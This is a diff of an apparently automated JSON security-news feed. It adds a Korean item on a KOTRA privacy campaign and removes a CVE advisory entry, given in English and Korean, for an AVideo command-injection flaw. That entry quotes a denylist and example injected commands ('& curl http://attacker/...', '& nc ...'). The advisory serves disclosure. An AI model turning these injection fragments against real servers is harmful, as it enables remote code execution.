@@ -1,6 +1,18 @@
 {
-  "fetched_at": "2026-07-20T05:31:09.124954+09:00",
+  "fetched_at": "2026-07-20T06:01:16.505619+09:00",
   "security_news": [
+    {
+      "title": "코트라, 대학생 서포터즈로 개인정보 보호 캠페인 시동",
+      "summary": "특히 최근 생성형 AI를 악용한 피싱 등 사이버 위협이 늘어나는 점을 감안해 AI 사용 시 주의해야 할 개인정보 보호 요령과 함께 이메일·온라인 무역 사기 예방법도 함께 전달했다. 안영주 코트라 개인정보보호책임자(CPO...",
+      "content": "",
+      "title_ko": null,
+      "summary_ko": null,
+      "summary_3lines": "1. 코트라, 대학생 서포터즈로 개인정보 보호 캠페인 시작\n2. 생성형 AI 악용한 피싱 및 무역 사기 예방 정보 제공\n3. 코트라 CPO, AI 사용 시 개인정보 보호 요령 강조",
+      "link": "http://www.worktoday.co.kr/news/articleView.html?idxno=86865",
+      "source": "naver",
+      "published": "2026-07-20T06:00:00+09:00",
+      "lang": "ko"
+    },
     {
       "title": "친팔레스타인 해킹조직 \"이스라엘 금융·국방 데이터 120TB 삭제\"",
       "summary": "이스라엘 사이버보안기업 라드웨어(Radware)는 당시 이스라엘 대상 악성 네트워크 활동이 700% 급증했다고 발표한 바 있으며, 핸달라(Handala) 등 다른 친이란·친팔레스타인 조직들도 이스라엘 에너지·치안 기관을 겨냥한...",
@@ -1654,21 +1666,6 @@
       "link": "https://cvefeed.io/vuln/detail/CVE-2026-44182",
       "source": "cvefeed",
       "published": "2026-07-17T07:05:09+09:00",
-      "lang": "en"
-    },
-    {
-      "title": "CVE-2026-55173 - AVideo incomplete fix for CVE-2026-33482: sanitizeFFmpegCommand still allows a single '&' (background operator), giving OS command execution at the same execAsync sh -c sink",
-      "summary": "CVE ID :CVE-2026-55173\n  \nPublished : July 16, 2026, 8:41 p.m. | 36 minutes ago\n  \nDescription :WWBN AVideo is an open source video platform. Versions 29.0 and below remain vulnerable to OS command injection because the fix for CVE-2026-33482 was incomplete and still does not neutralize a single & ( the shell background operator). CVE-2026-33482 reported that sanitizeFFmpegCommand() (plugin/API/standAlone/functions.php) failed to strip $(...) command substitution, allowing OS command injection at the execAsync() sh -c sink. The fix (commit 25c8ab90) added $, (, ), {, }, \\n, \\r to the denylist character class and a str_replace('&&', '', ...), but did not account for the single &. ffmpeg.json.php builds the command from _decryptString(getInput('codeToExecEncrypted')). This is the same threat model the original advisory accepted (“an attacker who can craft a valid encrypted payload can achieve arbitrary command execution on the standalone encoder server”) and the same CVSS basis (AV:N/AC:H/PR:N). Multiple &-separated commands can be chained (e.g. download + execute). Redirect-based payloads are blocked by the > strip, but command execution (e.g. & curl http://attacker/..., & nc ..., dropping/running a file) is not. This issue has been patched by this commit: https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f.\n  \nSeverity: 0.0 | NA\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
-      "description": "CVE ID :CVE-2026-55173\n  \nPublished : July 16, 2026, 8:41 p.m. | 36 minutes ago\n  \nDescription :WWBN AVideo is an open source video platform. Versions 29.0 and below remain vulnerable to OS command injection because the fix for CVE-2026-33482 was incomplete and still does not neutralize a single & ( the shell background operator). CVE-2026-33482 reported that sanitizeFFmpegCommand() (plugin/API/standAlone/functions.php) failed to strip $(...) command substitution, allowing OS command injection at the execAsync() sh -c sink. The fix (commit 25c8ab90) added $, (, ), {, }, \\n, \\r to the denylist character class and a str_replace('&&', '', ...), but did not account for the single &. ffmpeg.json.php builds the command from _decryptString(getInput('codeToExecEncrypted')). This is the same threat model the original advisory accepted (“an attacker who can craft a valid encrypted payload can achieve arbitrary command execution on the standalone encoder server”) and the same CVSS basis (AV:N/AC:H/PR:N). Multiple &-separated commands can be chained (e.g. download + execute). Redirect-based payloads are blocked by the > strip, but command execution (e.g. & curl http://attacker/..., & nc ..., dropping/running a file) is not. This issue has been patched by this commit: https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f.\n  \nSeverity: 0.0 | NA\n  \n  Visit the link for more details, such as CVSS details, affected products, timeline, and more...",
-      "title_ko": "CVE-2026-55173 - CVE-2026-33482에 대한 AVideo 불완전 수정: sanitizeFFmpegCommand는 여전히 단일 '&'(백그라운드 연산자)를 허용하여 동일한 execAsync sh -c 싱크에서 OS 명령 실행을 제공합니다.",
-      "summary_ko": "CVE ID:CVE-2026-55173\n  \n게시일 : 2026년 7월 16일 오후 8시 41분 | 36분 전\n  \n설명 :WWBN AVideo는 오픈 소스 비디오 플랫폼입니다. 버전 29.0 이하는 CVE-2026-33482에 대한 수정이 불완전하고 여전히 단일 &(쉘 백그라운드 연산자)를 무력화하지 않기 때문에 OS 명령 삽입에 취약한 상태로 남아 있습니다. CVE-2026-33482는 sanitizeFFmpegCommand()(plugin/API/standAlone/functions.php)가 $(...) 명령 대체를 제거하지 못해 execAsync() sh -c 싱크에서 OS 명령 주입을 허용한다고 보고했습니다. 수정 사항(커밋 25c8ab90)에서는 $, (, ), {, }, \\n, \\r을 거부 목록 문자 클래스와 str_replace('&&', '', ...)에 추가했지만 단일 &는 고려하지 않았습니다. ffmpeg.json.php는 _decryptString(getInput('codeToExecEncrypted'))에서 명령을 빌드합니다. 이는 원래 권고에서 받아들인 위협 모델(“유효한 암호화 페이로드를 만들 수 있는 공격자는 독립형 인코더 서버에서 임의의 명령 실행을 달성할 수 있습니다”)과 동일한 CVSS 기반(AV:N/AC:H/PR:N)입니다. &로 구분된 여러 명령을 연결할 수 있습니다(예: 다운로드 + 실행). 리디렉션 기반 페이로드는 > 스트립에 의해 차단되지만 명령 실행(예: & cur http://attacker/..., & nc ..., 파일 삭제/실행)은 차단되지 않습니다. 이 문제는 https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f 커밋으로 패치되었습니다.\n  \n심각도: 0.0 | 해당 없음\n  \n  CVSS 세부 정보, 영향을 받는 제품, 타임라인 등과 같은 자세한 내용을 보려면 링크를 방문하세요.",
-      "summary_3lines": "1. CVE-2026-55173\n2. 26.07.17 오전5:41\n3. WWBN AVideo is an open source video platform. Vers",
-      "cve_id": "CVE-2026-55173",
-      "cvss": "",
-      "severity": "",
-      "link": "https://cvefeed.io/vuln/detail/CVE-2026-55173",
-      "source": "cvefeed",
-      "published": "2026-07-17T05:41:26+09:00",
       "lang": "en"
     }
   ],
